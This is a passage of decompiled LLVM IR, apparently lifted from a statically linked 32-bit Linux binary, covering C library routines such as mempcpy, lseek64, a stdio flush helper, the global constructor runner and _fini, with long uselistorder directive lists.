  %v3_805571e = icmp eq i16 %v2_805571e, 0
  br i1 %v3_805571e, label %dec_label_pc_8055737, label %dec_label_pc_8055722

dec_label_pc_8055722:                             ; preds = %dec_label_pc_805571b, %dec_label_pc_805570e
  store i32 9, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805572e

dec_label_pc_805572e:                             ; preds = %dec_label_pc_805573b, %dec_label_pc_8055722
  %v0_805572e = load i32, i32* @ebx, align 4
  %v1_805572e = inttoptr i32 %v0_805572e to i16*
  %v2_805572e = load i16, i16* %v1_805572e, align 2
  %v3_805572e = or i16 %v2_805572e, 8
  store i16 %v3_805572e, i16* %v1_805572e, align 2
  br label %dec_label_pc_8055756

dec_label_pc_8055737:                             ; preds = %dec_label_pc_805571b
  %v2_8055737 = and i16 %v2_805571b, 64
  %v3_8055737 = icmp eq i16 %v2_8055737, 0
  br i1 %v3_8055737, label %dec_label_pc_8055750, label %dec_label_pc_805573b

dec_label_pc_805573b:                             ; preds = %dec_label_pc_8055737
  %v2_805573c = call i32 @__stdio_wcommit(i32 %v0_805573b)
  %v1_8055742 = icmp eq i32 %v2_805573c, 0
  %v1_8055744 = icmp eq i1 %v1_8055742, false
  br i1 %v1_8055744, label %dec_label_pc_805572e, label %dec_label_pc_8055746

dec_label_pc_8055746:                             ; preds = %dec_label_pc_805573b
  %v0_8055746 = load i32, i32* @ebx, align 4
  %v1_8055746 = inttoptr i32 %v0_8055746 to i16*
  %v2_8055746 = load i16, i16* %v1_8055746, align 2
  %v3_8055746 = and i16 %v2_8055746, -65
  store i16 %v3_8055746, i16* %v1_8055746, align 2
  %v0_805574a = load i32, i32* @ebx, align 4
  %v1_805574a = add i32 %v0_805574a, 8
  %v2_805574a = inttoptr i32 %v1_805574a to i32*
  %v3_805574a = load i32, i32* %v2_805574a, align 4
  %v2_805574d = add i32 %v0_805574a, 28
  %v3_805574d = inttoptr i32 %v2_805574d to i32*
  store i32 %v3_805574a, i32* %v3_805574d, align 4
  %v0_8055750.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055750

dec_label_pc_8055750:                             ; preds = %dec_label_pc_8055737, %dec_label_pc_8055746
  %v9_8055750 = phi i32 [ %v0_805573b, %dec_label_pc_8055737 ], [ %v0_8055750.pre, %dec_label_pc_8055746 ]
  %v1_8055750 = inttoptr i32 %v9_8055750 to i16*
  %v2_8055750 = load i16, i16* %v1_8055750, align 2
  %v3_8055750 = or i16 %v2_8055750, 1
  store i16 %v3_8055750, i16* %v1_8055750, align 2
  br label %dec_label_pc_8055756

dec_label_pc_8055756:                             ; preds = %dec_label_pc_805572e, %dec_label_pc_8055750
  %storemerge = phi i32 [ 0, %dec_label_pc_8055750 ], [ -1, %dec_label_pc_805572e ]
  %v2_8055756 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055756, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_8055705, { 1, 2, 0 }
  uselistorder i16 1, { 1, 0 }
  uselistorder i32 28, { 52, 29, 53, 54, 55, 56, 57, 7, 6, 37, 38, 30, 31, 18, 59, 60, 58, 5, 8, 0, 19, 20, 9, 21, 10, 22, 11, 23, 12, 24, 25, 13, 26, 27, 28, 32, 33, 49, 1, 14, 34, 35, 15, 36, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 16, 3, 2, 4, 17, 51 }
  uselistorder i32 8, { 209, 210, 211, 212, 213, 140, 141, 139, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 28, 27, 90, 29, 228, 30, 31, 237, 142, 143, 144, 154, 155, 286, 78, 288, 289, 17, 204, 287, 79, 135, 238, 239, 240, 241, 242, 243, 244, 5, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 6, 16, 229, 230, 231, 232, 233, 234, 235, 236, 227, 257, 258, 259, 92, 7, 260, 93, 8, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 91, 278, 279, 9, 280, 281, 282, 283, 284, 10, 285, 11, 156, 157, 158, 159, 84, 94, 85, 95, 86, 96, 87, 97, 194, 195, 12, 145, 138, 136, 146, 147, 148, 150, 151, 152, 153, 149, 35, 34, 37, 13, 32, 33, 36, 0, 38, 39, 160, 133, 40, 98, 99, 161, 41, 162, 42, 100, 43, 134, 163, 80, 164, 165, 166, 167, 168, 169, 170, 171, 14, 172, 173, 15, 174, 175, 176, 3, 177, 178, 179, 180, 181, 44, 45, 182, 183, 184, 185, 186, 81, 187, 188, 46, 189, 101, 102, 103, 190, 191, 192, 193, 82, 57, 196, 197, 51, 52, 50, 75, 198, 49, 104, 89, 105, 106, 53, 107, 54, 108, 4, 47, 58, 59, 60, 109, 61, 110, 62, 55, 56, 63, 64, 65, 111, 66, 67, 68, 112, 69, 113, 199, 114, 70, 115, 71, 116, 200, 117, 72, 118, 73, 119, 120, 121, 74, 76, 201, 48, 202, 77, 203, 122, 137, 83, 123, 26, 124, 25, 125, 24, 126, 23, 127, 22, 128, 21, 129, 20, 130, 19, 131, 18, 132, 205, 88, 206, 1, 207, 208, 2 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder i16 8, { 10, 11, 12, 3, 2, 0, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 9, { 51, 5, 22, 1, 2, 0, 11, 12, 4, 10, 7, 13, 8, 14, 9, 15, 25, 26, 23, 27, 28, 29, 30, 31, 32, 33, 16, 34, 35, 36, 37, 19, 38, 17, 20, 21, 18, 48, 39, 6, 40, 41, 42, 43, 44, 45, 24, 46, 47, 49, 50, 3 }
  uselistorder i16 0, { 0, 5, 1, 6, 4, 2, 3, 35, 36, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 7, 8 }
  uselistorder i32 65536, { 3, 4, 5, 135, 134, 133, 136, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 17, 16, 19, 20, 18, 22, 21, 23, 1, 24, 0, 2, 25, 27, 26, 28, 29, 32, 30, 31, 33, 37, 34, 38, 35, 39, 36, 40, 41, 42, 43, 45, 44, 48, 46, 49, 47, 50, 51, 52, 53, 56, 54, 57, 55, 60, 58, 61, 59, 62, 63, 64, 65, 66, 68, 67, 69, 70, 71, 72, 74, 73, 76, 75, 78, 77, 79, 80, 81, 82, 85, 83, 86, 84, 88, 87, 90, 89, 91, 93, 92, 94, 95, 96, 97, 98, 100, 99, 102, 101, 104, 103, 105, 106, 107, 108, 111, 109, 112, 110, 114, 113, 116, 115, 117, 118, 119, 120, 123, 121, 124, 122, 126, 125, 127, 128, 129, 130, 131, 132 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055756, { 1, 0 }
  uselistorder label %dec_label_pc_8055750, { 1, 0 }
  uselistorder label %dec_label_pc_805571b, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @esi, align 4
  %v3_8055768 = inttoptr i32 %arg1 to i8*
  %v4_8055768 = call i32 @memcpy(i8* %v3_8055768, i32 %arg2, i32 %arg3)
  %v0_805576d = load i32, i32* @esi, align 4
  %v2_805576d = add i32 %v0_805576d, %arg3
  ret i32 %v2_805576d

; uselistorder directives
  uselistorder i32 (i8*, i32, i32)* @memcpy, { 0, 1, 4, 5, 6, 2, 3 }
  uselistorder i32* @esi, { 76, 77, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 78, 79, 80, 635, 636, 637, 638, 639, 640, 641, 642, 643, 646, 647, 2, 648, 649, 650, 651, 652, 653, 654, 33, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 3, 674, 4, 5, 675, 676, 677, 678, 679, 680, 681, 682, 683, 723, 92, 93, 6, 94, 95, 96, 97, 98, 467, 468, 469, 470, 684, 685, 686, 172, 173, 174, 175, 176, 177, 178, 724, 725, 726, 727, 1, 733, 734, 741, 735, 736, 739, 740, 616, 617, 35, 618, 7, 37, 38, 39, 703, 728, 8, 729, 9, 730, 731, 732, 704, 708, 10, 709, 710, 705, 706, 707, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 711, 712, 713, 714, 715, 716, 717, 718, 11, 719, 720, 721, 722, 424, 12, 425, 426, 471, 13, 472, 473, 355, 14, 356, 357, 474, 15, 475, 476, 477, 16, 478, 479, 17, 99, 480, 481, 179, 180, 18, 181, 182, 183, 184, 185, 186, 19, 187, 188, 189, 190, 191, 192, 193, 194, 195, 482, 483, 484, 485, 486, 100, 644, 645, 737, 738, 101, 102, 103, 104, 105, 107, 108, 128, 109, 110, 111, 112, 46, 20, 47, 113, 114, 115, 116, 117, 21, 51, 118, 106, 119, 120, 121, 40, 41, 42, 43, 44, 45, 48, 49, 50, 70, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 71, 122, 123, 124, 125, 126, 127, 34, 129, 130, 131, 132, 133, 134, 135, 136, 145, 146, 137, 138, 139, 140, 141, 142, 143, 144, 427, 428, 429, 430, 431, 432, 433, 22, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 196, 197, 198, 199, 201, 200, 0, 202, 203, 204, 205, 206, 207, 208, 209, 215, 210, 211, 212, 213, 214, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 241, 236, 237, 238, 239, 240, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 264, 259, 260, 261, 262, 263, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 23, 24, 278, 279, 280, 25, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 301, 296, 297, 298, 299, 300, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 334, 329, 330, 331, 332, 333, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 358, 359, 360, 366, 361, 362, 363, 364, 365, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 401, 395, 396, 397, 398, 399, 400, 402, 404, 405, 406, 407, 408, 409, 410, 411, 403, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 434, 435, 436, 437, 444, 445, 438, 439, 440, 441, 442, 443, 446, 448, 449, 450, 451, 452, 453, 454, 455, 447, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 72, 73, 74, 75, 30, 487, 488, 489, 490, 491, 492, 26, 493, 494, 495, 496, 497, 498, 499, 500, 501, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 27, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 502, 503, 504, 505, 506, 28, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 36, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 29, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 595, 592, 593, 594, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 31, 619, 32, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 742 }
}

define i32 @__GI_lseek64(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v1_80557a3 = call i32 @int80_syscall(i32 140)
  %tmp14 = icmp ult i32 %v1_80557a3, -4095
  br i1 %tmp14, label %dec_label_pc_80557be, label %dec_label_pc_80557af

dec_label_pc_80557af:                             ; preds = %entry
  %v1_80557b4 = sub i32 0, %v1_80557a3
  store i32 %v1_80557b4, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_80557c2

dec_label_pc_80557be:                             ; preds = %entry
  %v1_80557be = icmp eq i32 %v1_80557a3, 0
  br i1 %v1_80557be, label %dec_label_pc_80557c5, label %dec_label_pc_80557c2

dec_label_pc_80557c2:                             ; preds = %dec_label_pc_80557be, %dec_label_pc_80557af
  %v0_80557c2 = phi i32 [ %v1_80557a3, %dec_label_pc_80557be ], [ -1, %dec_label_pc_80557af ]
  br label %dec_label_pc_80557cc

dec_label_pc_80557c5:                             ; preds = %dec_label_pc_80557be
  %v2_80557c5 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_80557cc

dec_label_pc_80557cc:                             ; preds = %dec_label_pc_80557c2, %dec_label_pc_80557c5
  %v0_80557d1 = phi i32 [ %v0_80557c2, %dec_label_pc_80557c2 ], [ %v2_80557c5, %dec_label_pc_80557c5 ]
  ret i32 %v0_80557d1

; uselistorder directives
  uselistorder i32 %v1_80557a3, { 1, 2, 3, 0 }
  uselistorder i32 -8, { 103, 13, 97, 14, 98, 104, 105, 106, 18, 16, 17, 19, 20, 21, 15, 3, 1, 0, 2, 101, 112, 108, 109, 96, 110, 111, 107, 113, 114, 115, 22, 27, 23, 29, 24, 25, 26, 28, 4, 30, 5, 31, 32, 33, 34, 36, 35, 6, 37, 38, 39, 7, 44, 45, 47, 43, 42, 40, 41, 46, 48, 52, 49, 50, 51, 53, 54, 55, 56, 57, 8, 58, 59, 93, 9, 79, 10, 80, 63, 64, 65, 66, 88, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 83, 84, 85, 81, 82, 86, 87, 11, 99, 60, 61, 62, 89, 100, 90, 91, 92, 94, 95, 12, 102 }
  uselistorder i32* inttoptr (i32 -8 to i32*), { 1, 32, 33, 34, 27, 35, 36, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 37, 28, 29, 38, 30, 31, 39, 40, 41, 42, 15, 0, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 28, 29, 26, 27, 32, 33, 30, 31, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 140, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80557cc, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp5, i32* %stack_var_-16, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-12, align 4
  %v0_80557e7 = load i32, i32* @global_var_8057b6c.324, align 4
  %v10_80557ec = icmp eq i32 %v0_80557e7, -1
  br i1 %v10_80557ec, label %dec_label_pc_8055803, label %dec_label_pc_80557f1

dec_label_pc_80557f1:                             ; preds = %entry
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80557f3

dec_label_pc_80557f3:                             ; preds = %dec_label_pc_80557f3, %dec_label_pc_80557f1
  %v4_80557f3 = phi i32 [ %v3_80557f5, %dec_label_pc_80557f3 ], [ %v0_80557e7, %dec_label_pc_80557f1 ]
  call void @__pseudo_call(i32 %v4_80557f3)
  %v0_80557f5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80557f5 = add i32 %v0_80557f5, ptrtoint (i32* @global_var_8057b68.373 to i32)
  %v2_80557f5 = inttoptr i32 %v1_80557f5 to i32*
  %v3_80557f5 = load i32, i32* %v2_80557f5, align 4
  %v1_80557fb = add i32 %v0_80557f5, -4
  store i32 %v1_80557fb, i32* %ebx.global-to-local, align 4
  %v10_80557fe = icmp eq i32 %v3_80557f5, -1
  %v1_8055801 = icmp eq i1 %v10_80557fe, false
  br i1 %v1_8055801, label %dec_label_pc_80557f3, label %dec_label_pc_8055803.loopexit

dec_label_pc_8055803.loopexit:                    ; preds = %dec_label_pc_80557f3
  %v2_8055803.pre = load i32, i32* %stack_var_-16, align 4
  %v2_8055804.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8055803

dec_label_pc_8055803:                             ; preds = %dec_label_pc_8055803.loopexit, %entry
  %v2_8055804 = phi i32 [ %v2_8055804.pre, %dec_label_pc_8055803.loopexit ], [ %tmp6, %entry ]
  %v2_8055803 = phi i32 [ %v2_8055803.pre, %dec_label_pc_8055803.loopexit ], [ %tmp5, %entry ]
  store i32 %v2_8055804, i32* %ebx.global-to-local, align 4
  ret i32 %v2_8055803

; uselistorder directives
  uselistorder i32 %v0_80557e7, { 1, 0 }
  uselistorder i1 false, { 275, 276, 277, 278, 279, 280, 281, 285, 10, 11, 286, 26, 290, 291, 78, 292, 293, 294, 295, 296, 297, 271, 273, 272, 0, 298, 12, 300, 301, 302, 1, 13, 303, 304, 305, 306, 307, 308, 311, 309, 310, 14, 27, 312, 313, 314, 319, 315, 316, 317, 318, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 333, 332, 15, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 17, 349, 348, 16, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 376, 377, 380, 381, 382, 383, 384, 385, 386, 387, 398, 400, 434, 435, 436, 28, 401, 402, 403, 195, 118, 437, 446, 458, 459, 460, 461, 462, 464, 19, 465, 18, 466, 463, 455, 438, 456, 457, 287, 288, 289, 282, 283, 284, 452, 453, 454, 373, 374, 375, 196, 197, 198, 199, 29, 447, 81, 82, 30, 254, 35, 20, 255, 256, 257, 22, 258, 21, 259, 260, 261, 262, 263, 23, 47, 50, 48, 49, 2, 51, 52, 439, 440, 4, 441, 445, 442, 443, 444, 3, 448, 449, 450, 451, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 404, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 378, 379, 417, 418, 419, 420, 421, 422, 423, 424, 9, 426, 425, 24, 431, 427, 428, 429, 430, 432, 433, 83, 84, 182, 200, 170, 201, 202, 85, 183, 399, 203, 31, 79, 80, 119, 121, 120, 122, 204, 299, 205, 206, 207, 208, 209, 210, 211, 212, 213, 32, 214, 123, 125, 124, 5, 215, 216, 217, 6, 264, 7, 218, 8, 219, 220, 57, 36, 58, 37, 59, 86, 87, 38, 62, 88, 53, 54, 55, 56, 60, 61, 75, 76, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 89, 90, 39, 91, 40, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 105, 103, 104, 184, 106, 107, 41, 108, 42, 109, 43, 110, 111, 112, 114, 113, 115, 116, 117, 126, 127, 128, 129, 130, 131, 132, 133, 134, 185, 186, 187, 135, 136, 137, 140, 138, 139, 141, 142, 143, 144, 145, 147, 146, 151, 149, 148, 150, 152, 153, 154, 155, 158, 161, 159, 157, 156, 160, 162, 165, 168, 166, 164, 163, 167, 169, 171, 172, 174, 173, 179, 175, 176, 178, 177, 180, 181, 188, 189, 190, 191, 192, 193, 194, 221, 222, 223, 225, 226, 224, 227, 228, 229, 230, 232, 233, 234, 235, 236, 231, 237, 238, 239, 240, 241, 242, 243, 244, 245, 33, 246, 247, 248, 45, 44, 249, 46, 250, 251, 252, 253, 265, 266, 34, 267, 268, 269, 270, 274, 467, 77, 25, 468 }
  uselistorder i32 -4, { 15, 16, 17, 18, 122, 127, 128, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 147, 149, 32, 148, 136, 137, 138, 12, 139, 140, 135, 0, 1, 130, 131, 13, 132, 133, 134, 14, 2, 10, 11, 129, 141, 142, 143, 144, 145, 146, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 124, 123, 66, 67, 68, 69, 70, 125, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 7, 81, 82, 83, 84, 85, 86, 87, 4, 8, 88, 89, 90, 9, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 126, 112, 113, 5, 6, 114, 115, 116, 117, 118, 119, 120, 3, 121 }
  uselistorder void (i32)* @__pseudo_call, { 6, 8, 0, 9, 10, 11, 7, 2, 3, 4, 5, 1 }
  uselistorder i32 -1, { 29, 30, 93, 118, 123, 21, 13, 14, 124, 224, 122, 225, 226, 227, 20, 228, 229, 230, 231, 232, 92, 233, 125, 117, 94, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 95, 144, 145, 146, 147, 234, 235, 148, 149, 31, 150, 151, 152, 96, 97, 98, 99, 100, 205, 153, 154, 101, 102, 0, 32, 155, 17, 239, 212, 103, 156, 157, 158, 104, 159, 33, 160, 34, 237, 37, 36, 38, 39, 28, 27, 26, 40, 41, 35, 238, 10, 161, 162, 163, 1, 105, 42, 2, 91, 210, 211, 164, 236, 213, 214, 43, 106, 206, 44, 107, 108, 109, 110, 111, 112, 113, 165, 114, 166, 115, 45, 167, 168, 3, 4, 5, 169, 46, 116, 6, 47, 170, 18, 16, 198, 88, 171, 89, 172, 90, 173, 199, 48, 174, 175, 191, 176, 177, 192, 178, 179, 193, 180, 181, 194, 182, 183, 195, 184, 185, 196, 186, 187, 197, 49, 200, 188, 189, 50, 201, 7, 51, 54, 202, 53, 203, 52, 55, 56, 204, 57, 58, 59, 22, 60, 61, 62, 63, 8, 23, 9, 64, 65, 24, 190, 19, 66, 67, 207, 208, 68, 209, 69, 70, 71, 72, 15, 73, 74, 75, 11, 76, 77, 12, 215, 216, 217, 218, 78, 25, 79, 219, 80, 81, 82, 83, 84, 220, 221, 85, 86, 87, 222, 223, 119, 120, 121 }
  uselistorder i32 1, { 391, 390, 185, 392, 393, 394, 132, 841, 842, 843, 395, 127, 124, 128, 123, 126, 129, 125, 290, 396, 122, 121, 397, 117, 118, 116, 119, 120, 398, 164, 163, 249, 844, 845, 357, 358, 380, 399, 84, 85, 602, 400, 401, 187, 186, 250, 251, 836, 837, 838, 839, 252, 846, 847, 404, 403, 402, 69, 70, 68, 71, 405, 848, 849, 850, 851, 852, 406, 188, 189, 853, 291, 854, 855, 856, 857, 858, 859, 292, 407, 39, 253, 860, 408, 381, 40, 861, 862, 181, 182, 0, 863, 1, 864, 865, 184, 293, 232, 866, 177, 2, 867, 868, 191, 192, 190, 869, 870, 180, 871, 872, 409, 193, 194, 410, 131, 130, 873, 874, 875, 876, 411, 196, 198, 197, 195, 359, 412, 877, 3, 878, 4, 879, 880, 881, 882, 883, 884, 885, 246, 886, 413, 382, 114, 115, 887, 5, 888, 889, 6, 890, 183, 891, 162, 161, 414, 165, 415, 892, 893, 894, 895, 896, 897, 248, 383, 43, 44, 45, 294, 295, 417, 416, 419, 418, 37, 35, 36, 38, 421, 420, 33, 31, 32, 34, 422, 424, 423, 166, 425, 426, 427, 645, 428, 42, 41, 429, 149, 150, 430, 431, 167, 432, 168, 169, 937, 938, 939, 940, 437, 436, 435, 434, 433, 18, 21, 19, 20, 17, 941, 254, 438, 440, 439, 199, 441, 147, 148, 442, 134, 133, 233, 445, 444, 443, 296, 446, 297, 200, 176, 175, 809, 810, 178, 179, 7, 811, 812, 447, 255, 360, 593, 591, 589, 449, 448, 935, 592, 936, 450, 298, 451, 361, 453, 452, 201, 202, 299, 904, 905, 906, 455, 454, 144, 146, 145, 907, 908, 909, 910, 911, 457, 456, 72, 76, 73, 74, 75, 362, 903, 300, 203, 205, 206, 204, 225, 301, 458, 256, 459, 898, 899, 900, 901, 462, 461, 460, 78, 77, 79, 245, 302, 463, 29, 30, 8, 304, 464, 912, 913, 914, 915, 916, 303, 917, 918, 919, 920, 921, 922, 257, 923, 226, 258, 924, 925, 926, 927, 928, 259, 363, 929, 930, 931, 932, 933, 934, 468, 467, 466, 465, 136, 138, 135, 137, 139, 260, 261, 469, 262, 263, 305, 472, 471, 470, 306, 364, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 716, 717, 101, 100, 99, 902, 487, 486, 93, 94, 95, 488, 489, 307, 308, 491, 490, 207, 9, 492, 493, 102, 495, 494, 309, 496, 497, 499, 498, 500, 502, 501, 503, 151, 504, 725, 726, 727, 728, 506, 505, 50, 46, 47, 49, 48, 51, 10, 729, 730, 731, 732, 11, 733, 734, 735, 736, 737, 310, 738, 311, 739, 509, 508, 507, 12, 264, 646, 13, 227, 159, 157, 160, 158, 833, 265, 365, 834, 740, 741, 742, 312, 743, 228, 171, 813, 229, 510, 174, 172, 173, 745, 744, 230, 746, 511, 54, 55, 53, 52, 747, 512, 748, 384, 64, 66, 65, 67, 749, 385, 56, 58, 57, 59, 603, 315, 604, 313, 605, 606, 314, 594, 595, 316, 607, 596, 317, 597, 318, 598, 319, 599, 320, 600, 321, 601, 322, 608, 323, 609, 610, 611, 612, 613, 615, 614, 617, 324, 618, 513, 624, 625, 325, 519, 518, 517, 516, 515, 514, 209, 208, 210, 211, 619, 620, 621, 622, 623, 215, 214, 213, 212, 216, 616, 366, 520, 217, 718, 522, 521, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 367, 523, 326, 327, 368, 524, 525, 369, 526, 370, 527, 386, 537, 536, 535, 534, 533, 532, 531, 530, 529, 528, 154, 152, 156, 153, 155, 538, 328, 539, 329, 266, 371, 540, 543, 542, 541, 330, 372, 639, 640, 641, 642, 331, 643, 644, 332, 545, 544, 218, 219, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 551, 550, 387, 549, 548, 547, 388, 546, 170, 14, 350, 15, 234, 235, 333, 664, 665, 666, 667, 668, 669, 670, 231, 671, 672, 673, 373, 334, 674, 675, 552, 676, 556, 555, 554, 553, 141, 140, 142, 143, 677, 678, 679, 374, 680, 557, 681, 559, 558, 87, 86, 88, 682, 683, 375, 684, 685, 686, 376, 687, 560, 688, 267, 268, 561, 105, 107, 106, 103, 104, 108, 689, 377, 691, 690, 692, 269, 270, 563, 562, 109, 110, 693, 694, 695, 378, 696, 564, 697, 271, 272, 566, 565, 112, 111, 113, 698, 699, 700, 379, 701, 567, 702, 273, 274, 275, 569, 568, 96, 97, 98, 703, 704, 705, 706, 707, 708, 570, 709, 276, 277, 278, 279, 280, 573, 572, 571, 91, 90, 89, 92, 710, 712, 713, 711, 714, 574, 715, 281, 282, 283, 576, 575, 82, 81, 80, 83, 719, 721, 722, 720, 723, 577, 724, 284, 285, 286, 579, 578, 62, 61, 60, 63, 750, 751, 752, 753, 338, 754, 337, 755, 756, 757, 758, 760, 761, 762, 763, 764, 287, 765, 351, 236, 766, 341, 767, 768, 352, 237, 769, 770, 339, 759, 340, 771, 772, 773, 342, 774, 775, 343, 776, 353, 238, 777, 354, 239, 778, 779, 355, 240, 780, 781, 356, 241, 782, 783, 784, 785, 786, 344, 787, 788, 789, 790, 791, 792, 793, 345, 243, 242, 794, 795, 796, 797, 335, 336, 798, 800, 801, 799, 346, 802, 803, 804, 805, 806, 807, 347, 590, 348, 808, 288, 583, 582, 581, 580, 389, 28, 25, 24, 23, 26, 22, 27, 16, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 584, 220, 824, 825, 827, 289, 828, 826, 244, 829, 830, 247, 831, 832, 349, 585, 222, 223, 221, 224, 835, 840, 942, 587, 586, 588 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_805580a = load i32, i32* @ebx, align 4
  %v1_805580b = call i32 @__get_pc_thunk_bx(i32 %v0_805580a)
  store i32 %v1_805580b, i32* @eax, align 4
  %v0_8055816 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_8055816

; uselistorder directives
  uselistorder i32* @eax, { 23, 10, 349, 350, 352, 169, 351, 353, 354, 3, 161, 356, 357, 358, 162, 359, 360, 13, 12, 361, 362, 14, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 159, 160, 274, 275, 277, 276, 387, 390, 391, 397, 164, 398, 4, 393, 396, 394, 348, 15, 347, 16, 392, 17, 380, 18, 157, 340, 11, 21, 341, 22, 381, 388, 163, 389, 170, 383, 382, 384, 386, 385, 271, 278, 262, 279, 280, 172, 5, 171, 236, 235, 281, 282, 283, 355, 395, 24, 237, 0, 6, 7, 284, 173, 174, 175, 25, 176, 177, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 219, 26, 218, 178, 179, 180, 181, 123, 220, 221, 222, 223, 27, 28, 29, 224, 30, 31, 32, 225, 142, 226, 143, 144, 227, 19, 145, 228, 146, 229, 147, 148, 230, 231, 232, 233, 234, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 33, 251, 2, 34, 1, 35, 252, 36, 37, 38, 